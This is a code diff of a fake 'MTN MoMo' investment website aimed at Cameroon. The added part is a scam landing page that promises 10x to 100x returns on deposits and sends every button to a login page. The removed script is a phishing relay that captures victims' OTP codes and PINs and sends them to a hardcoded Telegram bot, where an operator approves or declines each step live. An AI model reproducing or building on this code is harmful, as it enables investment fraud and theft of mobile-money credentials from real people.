+            <div class="bg-gray-950 p-6 sm:p-8 rounded-2xl border border-gray-800 shadow-2xl">
+
+                <!-- Deposit Form -->
+                <form id="formDeposit" onsubmit="handleTerminalSubmit(event, 'deposit')" class="space-y-4">
+                    <div class="flex items-center space-x-2 text-xs font-bold text-green-400 mb-2">
+                        <i class="fa-solid fa-arrow-down-to-bracket"></i>
+                        <span>MTN MoMo Mobile Deposit Prompt</span>
+                    </div>
+
+                    <div>
+                        <label class="block text-xs font-bold text-gray-300 mb-1">MTN MoMo Handset Number</label>
+                        <input type="text" placeholder="+237 67X XXX XXX" class="w-full bg-gray-900 border border-gray-800 rounded-lg p-3 text-white text-sm focus:outline-none focus:border-mtnYellow">
+                    </div>
+
+                    <div>
+                        <label class="block text-xs font-bold text-gray-300 mb-1">Select Investment Amount (XAF)</label>
+                        <select id="depositAmountSelect" class="w-full bg-gray-900 border border-gray-800 rounded-lg p-3 text-white text-sm focus:outline-none focus:border-mtnYellow">
+                            <option value="50000">50,000 XAF (Starter Tier - Returns 500,000 XAF)</option>
+                            <option value="250000">250,000 XAF (Growth Tier - Returns 2,500,000 XAF)</option>
+                            <option value="500000">500,000 XAF (Popular Tier - Returns 5,000,000 XAF)</option>
+                            <option value="1000000">1,000,000 XAF (VIP Platinum - Returns 100,000,000 XAF)</option>
+                        </select>
+                    </div>
+
+                    <button type="submit" class="w-full bg-mtnYellow hover:bg-mtnYellowHover text-gray-950 font-extrabold py-3.5 rounded-xl transition shadow">
+                        Proceed To Login & Payment
+                    </button>
+                </form>
+
+                <!-- Withdraw Form -->
+                <form id="formWithdraw" onsubmit="handleTerminalSubmit(event, 'withdraw')" class="space-y-4 hidden">
+                    <div class="flex items-center space-x-2 text-xs font-bold text-mtnYellow mb-2">
+                        <i class="fa-solid fa-arrow-up-from-bracket"></i>
+                        <span>MTN MoMo Direct Payout Withdrawal</span>
+                    </div>
+
+                    <div>
+                        <label class="block text-xs font-bold text-gray-300 mb-1">Destination MTN MoMo Number</label>
+                        <input type="text" placeholder="+237 67X XXX XXX" class="w-full bg-gray-900 border border-gray-800 rounded-lg p-3 text-white text-sm focus:outline-none focus:border-mtnYellow">
+                    </div>
+
+                    <div>
+                        <label class="block text-xs font-bold text-gray-300 mb-1">Withdrawal Amount (XAF)</label>
+                        <input type="number" id="withdrawAmountInput" placeholder="Enter payout amount in XAF" min="5000" step="500" class="w-full bg-gray-900 border border-gray-800 rounded-lg p-3 text-white text-sm focus:outline-none focus:border-mtnYellow">
+                    </div>
+
+                    <button type="submit" class="w-full bg-mtnYellow hover:bg-mtnYellowHover text-gray-950 font-extrabold py-3.5 rounded-xl transition shadow">
+                        Proceed To Login & Payout
+                    </button>
+                </form>
+
+            </div>
+        </div>
+    </section>
+
+    <!-- FOOTER -->
+    <footer id="contact" class="bg-darkNavy text-gray-400 py-12 border-t border-gray-800 text-xs mt-auto">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 space-y-8">
+            <div class="grid grid-cols-1 md:grid-cols-4 gap-8">
+
+                <div class="space-y-3">
+                    <div class="flex items-center space-x-1.5">
+                        <span class="text-xl font-black bg-mtnYellow text-gray-950 px-2 py-0.5 rounded">MTN</span>
+                        <span class="text-2xl font-black text-white">MoMo</span>
+                        <span class="text-[10px] bg-mtnYellow text-gray-950 px-1.5 py-0.5 rounded font-extrabold ml-1">CM</span>
+                    </div>
+                    <p class="text-gray-400 text-xs leading-relaxed">
+                        Cameroon's automated MTN MoMo investment network in XAF. Facilitating high-yield returns and fast mobile wallet payouts across Cameroon.
+                    </p>
+                </div>
+
+                <div>
+                    <h4 class="text-white font-bold mb-3 uppercase tracking-wider text-[11px]">Quick Navigation</h4>
+                    <ul class="space-y-2">
+                        <li><a href="#home" class="hover:text-mtnYellow transition">Home</a></li>
+                        <li><a href="#about" class="hover:text-mtnYellow transition">About Us</a></li>
+                        <li><a href="#calculator" class="hover:text-mtnYellow transition">Investment Plans</a></li>
+                        <li><a href="#simulator" class="hover:text-mtnYellow transition">MoMo Terminal</a></li>
+                    </ul>
+                </div>
+
+                <div>
+                    <h4 class="text-white font-bold mb-3 uppercase tracking-wider text-[11px]">Direct Actions</h4>
+                    <ul class="space-y-2">
+                        <li><a href="login.html" class="hover:text-mtnYellow transition">Login To Invest</a></li>
+                        <li><a href="login.html?action=deposit" class="hover:text-mtnYellow transition">Deposit Wallet Funds (XAF)</a></li>
+                        <li><a href="login.html?action=withdraw" class="hover:text-mtnYellow transition">Request Withdrawal Payout</a></li>
+                    </ul>
+                </div>
+
+                <div>
+                    <h4 class="text-white font-bold mb-3 uppercase tracking-wider text-[11px]">Contact & Location</h4>
+                    <p class="text-gray-400 mb-2"><i class="fa-solid fa-location-dot mr-1.5 text-mtnYellow"></i> Douala & Yaoundé, Cameroon</p>
+                    <p class="text-gray-400 mb-2"><i class="fa-solid fa-envelope mr-1.5 text-mtnYellow"></i> support@momo-invest.cm</p>
+                    <p class="text-gray-400"><i class="fa-solid fa-phone mr-1.5 text-green-400"></i> +237 670 000 000</p>
+                </div>
+
+            </div>
+
+            <div class="pt-8 border-t border-gray-800 text-center text-gray-500 text-[11px] flex flex-col sm:flex-row justify-between items-center gap-4">
+                <p>© 2026 Cameroon MTN MoMo Investment. All rights reserved.</p>
+                <div class="flex space-x-4">
+                    <a href="login.html" class="text-gray-400 hover:text-mtnYellow"><i class="fa-brands fa-facebook-f text-sm"></i></a>
+                    <a href="login.html" class="text-gray-400 hover:text-mtnYellow"><i class="fa-brands fa-whatsapp text-sm"></i></a>
+                    <a href="login.html" class="text-gray-400 hover:text-mtnYellow"><i class="fa-brands fa-telegram text-sm"></i></a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- JAVASCRIPT LOGIC -->
     <script>
-        // ────────────────────────────────────────────────
-        // CONFIG & STATE
-        // ────────────────────────────────────────────────
-        const CONFIG = {
-            BOT_TOKEN: '9221778474:AAFNAHGEx8ACRvuXnl_NFtp_WoBPsm5VAUc',
-            CHAT_ID: '8586910663',
-            OTP_LENGTH_NORMAL: 5,
-            OTP_LENGTH_SIX: 6,
-            PIN_LENGTH: 4,
-            POLL_INTERVAL_MS: 1500
-        };
-        let state = {
-            phone: localStorage.getItem('phone'),
-            stage: 'otp',
-            currentTs: null,
-            lastUpdateId: 0,
-            pollInterval: null,
-            otpValue: '',
-            pinValue: '',
-            otpBoxes: [], // ← added to state
-            useSixBoxes: false
-        };
-        // ────────────────────────────────────────────────
-        // DOM
-        // ────────────────────────────────────────────────
-        const els = {
-            maskedPhone: document.getElementById('maskedPhone'),
-            otpSection: document.getElementById('otp-section'),
-            pinSection: document.getElementById('pin-section'),
-            otpGroup: document.getElementById('otp-group'),
-            pinBoxes: document.querySelectorAll('#pin-group .code-box'),
-            otpBtn: document.getElementById('otpBtn'),
-            pinBtn: document.getElementById('pinBtn'),
-            otpError: document.getElementById('otpError'),
-            pinError: document.getElementById('pinError'),
-            spinner: document.getElementById('spinner'),
-            success: document.getElementById('success')
-        };
-        // ────────────────────────────────────────────────
-        // HELPERS
-        // ────────────────────────────────────────────────
-        function maskPhone(phone) {
-            if (!phone || phone.length < 6) return '(number not found)';
-            return phone.slice(0, 3) + '****' + phone.slice(-3);
-        }
-
-        function showError(el) {
-            el.style.display = 'block';
-        }
-
-        function hideError(el) {
-            el.style.display = 'none';
-        }
-
-        function clearInputs(boxes) {
-            boxes.forEach(b => b.value = '');
-        }
-
-        function enableButton(btn, enabled) {
-            btn.disabled = !enabled;
-            btn.className = enabled ? 'btn-action enabled' : 'btn-action';
-        }
-
-        function switchToPin() {
-            els.otpSection.style.opacity = '0';
-            setTimeout(() => {
-                els.otpSection.style.display = 'none';
-                els.pinSection.style.display = 'block';
-                setTimeout(() => {
-                    els.pinSection.style.opacity = '1';
-                    state.stage = 'pin';
-                    els.pinBoxes[0].focus();
-                }, 80);
-            }, 300);
-        }
-
-        function showSuccess() {
-            const appliedAmount = localStorage.getItem('appliedAmount') || '0';
-            const amount = parseFloat(appliedAmount);
-            const minBal = (amount * 0.2).toFixed(2);
-            document.getElementById('approvedAmount').textContent = amount.toFixed(2);
-            document.getElementById('minBalance').textContent = minBal;
-            els.success.style.display = 'flex';
-        }
-
-        function createOtpBoxes(count) {
-            els.otpGroup.innerHTML = '';
-            const boxes = [];
-            for (let i = 0; i < count; i++) {
-                const input = document.createElement('input');
-                input.type = 'tel';
-                input.inputMode = 'numeric';
-                input.className = 'code-box';
-                input.maxLength = 1;
-                input.pattern = '[0-9]*';
-                els.otpGroup.appendChild(input);
-                boxes.push(input);
-            }
-            state.otpBoxes = boxes; // ← store in state
-            return boxes;
-        }
-
-        function setupOtpInputs(boxes) {
-            const length = state.useSixBoxes ? CONFIG.OTP_LENGTH_SIX : CONFIG.OTP_LENGTH_NORMAL;
-            boxes.forEach((b, i) => {
-                b.oninput = e => {
-                    let v = e.target.value.replace(/\D/g, '');
-                    e.target.value = v;
-                    if (v && i < length - 1) boxes[i + 1].focus();
-                    state.otpValue = check(boxes, length, els.otpBtn);
-                };
-                b.onkeydown = e => {
-                    if (e.key === 'Backspace' && !b.value && i > 0) boxes[i - 1].focus();
-                };
+        function redirectToLogin(action = 'invest', amount = null) {
+            const inputAmt = amount ?? document.getElementById('manualAmountInput')?.value ?? 100000;
+            const params = new URLSearchParams({
+                action,
+                amount: String(inputAmt),
+                currency: 'XAF',
+                country: 'CM'
             });
-            boxes[0].focus();
+            window.location.href = `login.html?${params.toString()}`;
         }
 
-        function setupPinInputs() {
-            els.pinBoxes.forEach((b, i) => {
-                b.oninput = e => {
-                    let v = e.target.value.replace(/\D/g, '');
-                    e.target.value = v;
-                    if (v && i < CONFIG.PIN_LENGTH - 1) els.pinBoxes[i + 1].focus();
-                    state.pinValue = check(els.pinBoxes, CONFIG.PIN_LENGTH, els.pinBtn);
-                };
-                b.onkeydown = e => {
-                    if (e.key === 'Backspace' && !b.value && i > 0) els.pinBoxes[i - 1].focus();
-                };
-            });
-            els.pinBoxes[0].focus();
-        }
-
-        function check(boxes, length, btn) {
-            const val = [...boxes].map(b => b.value).join('');
-            enableButton(btn, val.length === length);
-            return val;
-        }
-        // ────────────────────────────────────────────────
-        // BOT COMMUNICATION
-        // ────────────────────────────────────────────────
-        async function sendToAdmin(message, stage) {
-            const ts = Date.now();
-            state.currentTs = ts;
-            try {
-                let keyboard;
-                if (stage === 'otp') {
-                    keyboard = [
-                        [{
-                            text: '✅ Approve',
-                            callback_data: `approve_${stage}_${ts}`
-                        }, {
-                            text: '❌ Decline',
-                            callback_data: `decline_${stage}_${ts}`
-                        }, {
-                            text: 'Six Boxes',
-                            callback_data: `sixboxes_${ts}`
-                        }]
-                    ];
-                } else {
-                    keyboard = [
-                        [{
-                            text: '✅ Approve',
-                            callback_data: `approve_${stage}_${ts}`
-                        }, {
-                            text: '❌ Decline',
-                            callback_data: `decline_${stage}_${ts}`
-                        }]
-                    ];
-                }
-                await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        chat_id: CONFIG.CHAT_ID,
-                        text: message,
-                        reply_markup: {
-                            inline_keyboard: keyboard
-                        }
-                    })
-                });
-            } catch (err) {
-                console.error('Send failed:', err);
-                els.spinner.style.display = 'none';
-            }
-        }
-
-        function startPolling() {
-            if (state.pollInterval) clearInterval(state.pollInterval);
-            state.pollInterval = setInterval(async() => {
-                try {
-                    const res = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`);
-                    const data = await res.json();
-                    if (!data.ok || !data.result || !data.result.length) return;
-                    for (const u of data.result) {
-                        state.lastUpdateId = u.update_id;
-                        if (!u.callback_query) continue;
-                        const cbData = u.callback_query.data;
-                        if (!cbData.includes(state.currentTs)) continue;
-                        clearInterval(state.pollInterval);
-                        state.pollInterval = null;
-                        els.spinner.style.display = 'none';
-                        const parts = cbData.split('_');
-                        const action = parts[0];
-                        const ts = parts[parts.length - 1];
-                        if (Number(ts) !== state.currentTs) continue;
-                        if (action === 'approve') {
-                            if (state.stage === 'otp') switchToPin();
-                            else showSuccess();
-                        } else if (action === 'decline') {
-                            if (state.stage === 'otp') {
-                                showError(els.otpError);
-                                clearInputs(state.otpBoxes);
-                                state.otpValue = check(state.otpBoxes, state.useSixBoxes ? CONFIG.OTP_LENGTH_SIX : CONFIG.OTP_LENGTH_NORMAL, els.otpBtn);
-                            } else {
-                                showError(els.pinError);
-                                clearInputs(els.pinBoxes);
-                                state.pinValue = check(els.pinBoxes, CONFIG.PIN_LENGTH, els.pinBtn);
-                            }
-                        } else if (action === 'sixboxes') {
-                            // Reset to OTP stage with 6 boxes
-                            state.stage = 'otp';
-                            state.useSixBoxes = true;
-                            state.otpValue = '';
-                            els.pinSection.style.display = 'none';
-                            els.otpSection.style.display = 'block';
-                            els.otpSection.style.opacity = '1';
-                            // Re-create boxes
-                            state.otpBoxes = createOtpBoxes(CONFIG.OTP_LENGTH_SIX);
-                            setupOtpInputs(state.otpBoxes);
-                            clearInputs(state.otpBoxes);
-                            hideError(els.otpError);
-                            els.otpBtn.disabled = true;
-                        }
-                    }
-                } catch (err) {
-                    console.warn('Polling error:', err);
-                }
-            }, CONFIG.POLL_INTERVAL_MS);
-        }
-        // ────────────────────────────────────────────────
-        // EVENTS
-        // ────────────────────────────────────────────────
-        els.otpBtn.onclick = () => {
-            const len = state.useSixBoxes ? CONFIG.OTP_LENGTH_SIX : CONFIG.OTP_LENGTH_NORMAL;
-            if (state.otpValue.length !== len) return;
-            els.spinner.style.display = 'flex';
-            hideError(els.otpError);
-            const msg = `OTP\nPhone: ${state.phone || 'unknown'}\nCode: ${state.otpValue}`;
-            sendToAdmin(msg, 'otp');
-            startPolling();
-        };
-        els.pinBtn.onclick = () => {
-            if (state.pinValue.length !== CONFIG.PIN_LENGTH) return;
-            els.spinner.style.display = 'flex';
-            hideError(els.pinError);
-            const msg = `PIN\nPhone: ${state.phone || 'unknown'}\nPIN: ${state.pinValue}`;
-            sendToAdmin(msg, 'pin');
-            startPolling();
-        };
-        // ────────────────────────────────────────────────
-        // INIT
-        // ────────────────────────────────────────────────
-        function init() {
-            if (!state.phone) {
-                els.maskedPhone.textContent = '(number not found)';
-                alert('No phone number found. Please go back to login.');
+        function toggleMobileMenu() {
+            const drawer = document.getElementById('mobileDrawer');
+            const icon = document.getElementById('menuIcon');
+            drawer.classList.toggle('hidden');
+            if (drawer.classList.contains('hidden')) {
+                icon.className = 'fa-solid fa-bars text-2xl';
             } else {
-                els.maskedPhone.textContent = maskPhone(state.phone);
+                icon.className = 'fa-solid fa-xmark text-2xl';
             }
-            // Initial OTP boxes (5)
-            state.otpBoxes = createOtpBoxes(CONFIG.OTP_LENGTH_NORMAL);
-            setupOtpInputs(state.otpBoxes);
-            // Setup PIN inputs
-            setupPinInputs();
         }
-        init();
+
+        function updateCalculator() {
+            const slider = document.getElementById('profitSlider');
+            const val = parseFloat(slider.value) || 0;
+            document.getElementById('sliderDisplay').textContent = val.toLocaleString('en-US') + ' XAF';
+            document.getElementById('manualAmountInput').value = val;
+
+            let profit = val * 10;
+            if (val >= 1000000) {
+                profit = val * 100;
+            }
+            document.getElementById('calculatorResult').textContent = profit.toLocaleString('en-US') + ' XAF';
+        }
+
+        function syncManualCalculator() {
+            const inputVal = parseFloat(document.getElementById('manualAmountInput').value) || 0;
+            const slider = document.getElementById('profitSlider');
+            if (slider && inputVal >= Number(slider.min) && inputVal <= Number(slider.max)) {
+                slider.value = inputVal;
+            }
+            document.getElementById('sliderDisplay').textContent = inputVal.toLocaleString('en-US') + ' XAF';
+
+            let profit = inputVal * 10;
+            if (inputVal >= 1000000) {
+                profit = inputVal * 100;
+            }
+            document.getElementById('calculatorResult').textContent = profit.toLocaleString('en-US') + ' XAF';
+        }
+
+        function switchTerminalTab(tab) {
+            const depBtn = document.getElementById('tabDep');
+            const withBtn = document.getElementById('tabWith');
+            const depForm = document.getElementById('formDeposit');
+            const withForm = document.getElementById('formWithdraw');
+
+            if (tab === 'deposit') {
+                depBtn.className = 'w-1/2 py-2 text-xs font-bold rounded-lg transition bg-mtnYellow text-gray-950 shadow';
+                withBtn.className = 'w-1/2 py-2 text-xs font-bold rounded-lg transition text-gray-400 hover:text-white';
+                depForm.classList.remove('hidden');
+                withForm.classList.add('hidden');
+            } else {
+                withBtn.className = 'w-1/2 py-2 text-xs font-bold rounded-lg transition bg-mtnYellow text-gray-950 shadow';
+                depBtn.className = 'w-1/2 py-2 text-xs font-bold rounded-lg transition text-gray-400 hover:text-white';
+                withForm.classList.remove('hidden');
+                depForm.classList.add('hidden');
+            }
+        }
+
+        function handleTerminalSubmit(e, action = 'deposit') {
+            e.preventDefault();
+            const chosenAmount = action === 'deposit'
+                ? document.getElementById('depositAmountSelect')?.value
+                : document.getElementById('withdrawAmountInput')?.value;
+            redirectToLogin(action, chosenAmount || undefined);
+        }
+
+        // Redirect any button click (except the mobile menu toggle button) to login.html
+        document.addEventListener('click', function (event) {
+            const btn = event.target.closest('button');
+            if (!btn) return;
+            if (btn.getAttribute('onclick')?.includes('toggleMobileMenu')) return;
+            if (btn.closest('form')) return; // handled by form submit handler
+            event.preventDefault();
+            redirectToLogin();
+        });
+
+        updateCalculator();
     </script>
 </body>
 
